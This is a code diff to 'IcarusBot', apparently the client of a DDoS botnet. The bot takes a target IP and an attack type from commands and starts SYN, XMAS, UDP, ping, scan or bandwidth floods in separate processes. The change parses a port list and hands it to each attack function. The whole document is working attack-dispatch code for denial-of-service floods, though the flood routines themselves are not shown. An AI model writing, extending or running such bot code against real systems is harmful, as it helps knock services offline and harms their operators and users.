@@ -183,6 +183,10 @@ class IcarusBot:
                     # Angus: We just keep running until a stop attack is issued.
                     # TODO: Specify port(s) to attack
                     try:
+                        portList = ports[1:len(ports) - 1].split(",")
+                        for n in range(0, len(portList)):
+                            portList[n] = int(portList[n])
+                        print(portList)
                         if attack_type in attackTypes:
                             self.attack_type = attack_type
                             self.status = "ATTACKING"
@@ -202,22 +206,22 @@ class IcarusBot:
                             # The following code is hilariously long and redundant, but who cares?
                             if self.mp is None:
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                             else:
                                 self.mp.terminate()
                                 self.mp = mp.Process(target=syn_flood.SYN_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                         elif attack_type == 'XMAS_FLOOD':
                             if self.mp is None:
                                 self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                             else:
                                 self.mp.terminate()
                                 self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                         elif attack_type == 'PING_FLOOD':
                             if self.mp is None:
@@ -232,12 +236,12 @@ class IcarusBot:
                         elif attack_type == 'UDP_FLOOD':
                             if self.mp is None:
                                 self.mp = mp.Process(target=udp_flood.UDP_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                             else:
                                 self.mp.terminate()
                                 self.mp = mp.Process(target=udp_flood.UDP_Flood,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList))
                                 self.mp.start()
                         elif attack_type == 'SCAN_FLOOD':
                             if self.mp is None:
@@ -252,12 +256,12 @@ class IcarusBot:
                         elif attack_type == 'BANDWIDTH_DDOS':
                             if self.mp is None:
                                 self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports, 65495))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
                                 self.mp.start()
                             else:
                                 self.mp.terminate()
                                 self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
-                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports, 65495))
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, portList, 65495))
                                 self.mp.start()
 
                         print("EXECUTING ATTACK:", attack_type)
